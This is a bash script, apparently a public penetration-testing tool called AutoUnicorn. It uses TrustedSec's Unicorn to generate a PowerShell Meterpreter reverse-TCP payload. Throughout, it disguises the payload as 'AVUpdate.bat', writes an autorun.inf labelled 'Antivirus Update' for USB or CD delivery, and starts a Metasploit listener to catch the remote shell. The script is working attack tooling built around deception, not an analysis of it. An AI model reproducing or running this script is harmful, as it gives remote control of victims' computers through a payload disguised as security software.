#!/usr/bin/env bash
# AutoUnicorn - Automated PowerShell Attack Creator Using TrustedSec Unicorn
# Jason Soto
# www.jsitech.com
# Twitter = @JsiTech
# Tested on Kali Linux

#####################################################################################

# Developed by Jason Soto
# jason_soto [AT] jsitech [DOT] com
# https://github.com/jsitech

######################################################################################

# Credit to @commonexploits, @trustedsec


# User options
OUTPUTNAME="AVUpdate.bat" # The payload created name
PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
MSFCONSOLE=`which msfconsole` # Path to the msfconsole script

clear
echo ""
echo -e "\e[34m##################################################################\e[00m"
echo ""
echo -e "*** AutoUnicorn -- Automated Powershell Attack Creator Using Unicorn By TrustedSec  ***"
echo ""
echo -e "\e[34m##################################################################\e[00m"
echo ""
sleep 3
clear

#Check For Unicorn in Current running Directory

ls unicorn/unicorn.py > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m I can't find Unicorn in your Current Working Directory I will try and Clone the Repo now"
    echo ""
    sleep 2
    echo ""
    echo -e "\e[01;32m[-]\e[00m Cloning Unicorn Repo...please wait"
    echo ""
    git clone https://github.com/trustedsec/unicorn/
    sleep 2
    ls unicorn/unicorn.py > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\e[01;32m[+]\e[00m Success,"
        cd ..
        echo ""
    else
        echo -e "\e[01;31m[!]\e[00m Unable to Clone Unicorn Repo, Cannot Continue"
        echo ""
        exit
    fi
fi

echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[34m--------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[93m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo ""
    IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
    IP=$(ifconfig "$IPINT" |egrep "inet add?r:" |cut -d ":" -f 2 |awk '{ print $1 }')
    echo -e "\e[93m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
    echo ""
    echo -e "\e[34m-------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What port number do you want to listen on?"
    echo -e "\e[34m-------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read PORT
    echo ""
elif [ "$INTEXT" = "2" ]; then
    echo ""
    echo -e "\e[93m[-]\e[00m Alternative system selected"
    echo ""
    echo -e "\e[34m--------------------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e "\e[34m--------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read IP
    echo ""
    echo ""
    echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
    echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read PORT
    echo ""
else
    echo -e "\e[93m[!]\e[00m You didnt select a valid option, try again"
    echo ""
    exit 1
fi
echo ""
echo -e "\e[93m[-]\e[00m Generating payload, please wait..."
echo ""

#Payload creator

python unicorn/unicorn.py "$PAYLOAD" "$IP" "$PORT" > /dev/null 2>&1

echo ""
echo -e "\e[93m[-]\e[00m Renaming Created Payload please wait..."
echo ""

mv powershell_attack.txt $OUTPUTNAME

echo ""
echo ""

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label=Antivirus Update" >> autorun/autorun.inf
echo ""
echo -e "\e[34m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"

echo ""
sleep 2
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Yes"
echo ""
echo " 2. No"
echo ""
echo -e "\e[34m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[93m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[93m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
    echo ""
    $MSFCONSOLE -r unicorn.rc
else
    echo ""
    echo -e "\e[93m[-]\e[00m Use unicorn.rc as msfconsole resource on your listener system:"
    echo ""
    echo -e "\e[34m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
    echo "$MSFCONSOLE -r unicorn.rc"
    echo ""
    echo -e "\e[34mm+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
fi

